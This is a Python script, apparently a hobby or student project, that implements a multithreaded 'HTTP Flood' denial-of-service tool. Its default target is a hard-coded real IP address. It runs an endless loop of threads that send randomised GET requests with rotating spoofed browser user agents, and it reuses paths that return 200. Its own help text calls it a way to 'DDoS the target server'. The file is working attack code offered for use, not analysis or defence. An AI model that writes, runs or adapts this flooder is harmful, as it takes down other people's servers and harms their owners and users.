# -*- coding: utf-8 -*-
"""
Created on Sun May 20 19:37:42 2018
@author: DrLC
"""

import socket
import string
import random
import sys
import threading
import time

THREAD_DEFAULT = 1
TARGET_DEFAULT = "47.94.138.231"
PORT_DEFAULT = 80


def print_help():
    print()
    print("+--------------------------+")
    print("|                          |")
    print("|     HTTP Flood           |")
    print("|                          |")
    print("|       by TakingOffPKU    |")
    print("|                          |")
    print("+--------------------------+")
    print()
    print("DDoS the target server process with toy-like HTTP Flood.")
    print()
    print("Use the following command to start attacking.")
    print("  python3 %s" % (sys.argv[0]))
    print("Optional arguments are:")
    print("  -H or --host\tIP address of the server.")
    print("  -P or --port\tPort of the server.")
    print("  -T or --thread\tMultithread.")
    print("Example:")
    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD"
          % (sys.argv[0]))
    print()


def getopt(ARGS):
    if '-h' in ARGS or '--help' in ARGS:
        try:
            assert False
        except:
            print_help()
            exit(0)
    ret = {"host": TARGET_DEFAULT,
           "port": PORT_DEFAULT,
           "thread": THREAD_DEFAULT}
    for i in range(1, len(ARGS)):
        if i % 2 == 1:
            if ARGS[i] in ['-H', '--host']:
                ret['host'] = str(ARGS[i + 1])
            elif ARGS[i] in ['-P', '--port']:
                ret['port'] = int(ARGS[i + 1])
            elif ARGS[i] in ['-T', '--thread']:
                ret['thread'] = int(ARGS[i + 1])
            else:
                try:
                    assert False
                except:
                    print_help()
                    exit(0)
    return ret


class sendGET(threading.Thread):
    THREAD = 0
    file_pool = []
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]

    def __init__(self, target, port):
        try:
            self.__target = target
            self.__port = port
            dice = random.randint(0,9)
            if dice == 0:
                self.__type = 0
            else:
                self.__type = 1
            sendGET.THREAD += 1
            threading.Thread.__init__(self)
        except KeyboardInterrupt:
            print("\nHTTP flood attack ends!")
            exit(0)

    def __del__(self):
        try:
            sendGET.THREAD -= 1
        except KeyboardInterrupt:
            print("\nHTTP flood attack ends!")
            exit(0)

    def run(self):
        try:
            print ("\r%d threads running" % sendGET.THREAD, end="")
            if self.__type == 0 or len(sendGET.file_pool) == 0:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.__target, self.__port))
                tmp = ''.join(random.sample(string.ascii_letters + string.digits + string.punctuation,
                                        random.randint(0, 10)))
                http_get = 'GET /' + tmp + ' HTTP/1.1\r\n'
                sock.send(bytes(http_get, encoding='utf-8'))
                sock.send("User-Agent: {}\r\n".format(random.choice(sendGET.user_agents)).encode("utf-8"))
                sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
                data = sock.recv(1024)
                if data.decode()[0:12] == 'HTTP/1.1 200':
                    sendGET.file_pool.append(tmp)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.__target, self.__port))
                http_get = 'GET /' + sendGET.file_pool[random.randint(0,len(sendGET.file_pool))] \
                           + ' HTTP/1.1\r\n'
                sock.send(bytes(http_get, encoding='utf-8'))
                sock.send("User-Agent: {}\r\n".format(random.choice(sendGET.user_agents)).encode("utf-8"))
                sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
            return
        except KeyboardInterrupt:
            print("\nHTTP flood attack ends!")
            exit(0)
        except socket.error:
            pass


if __name__ == "__main__":

    args = getopt(sys.argv)
    print()
    print("+--------------------------+")
    print("|                          |")
    print("|     HTTP Flood           |")
    print("|                          |")
    print("|       by TakingOffPKU    |")
    print("|                          |")
    print("+--------------------------+")
    print()
    print("Host: %s" % args["host"])
    print("Port: %d" % args["port"])
    print("Thread: %d" % args["thread"])
    print()
    print("HTTP flood attack will begin in")
    countdown = 5
    for i in range(countdown, 0, -1):
        tmp_str = '\r'
        for j in range(countdown, i - 1, -1):
            tmp_str += str(j) + "..."
        print(tmp_str, end="")
        time.sleep(1)
    print("\nHTTP flood attack begins!")

    while True:
        try:
            if sendGET.THREAD <= args['thread']:
                tmp = sendGET(args['host'], args['port'])
                tmp.start()
        except KeyboardInterrupt:
            print("\nHTTP flood attack ends!")
            exit(0)